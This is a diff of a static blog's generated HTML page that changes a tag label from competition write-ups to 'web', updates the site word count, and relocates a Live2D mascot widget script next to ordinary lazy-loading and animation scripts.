-                    <a href="/tags/%E6%AF%94%E8%B5%9BWP/">
-                        <span class="chip bg-color">比赛WP</span>
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
@@ -1422,7 +1485,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">13k</span>&nbsp;字
+                class="white-color">21.1k</span>&nbsp;字
             
             
             
@@ -1695,7 +1758,7 @@ $(function () {
     <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
     <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
     <script type="text/javascript" src="/js/firework.js"></script>
-
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script>
         <style>
             [bg-lazy] {
                 background-image: none !important;
@@ -1708,6 +1771,6 @@ $(function () {
                 preloadRatio: 1,
                 processImages: null,
             };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script></body>
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body>
 
 </html>
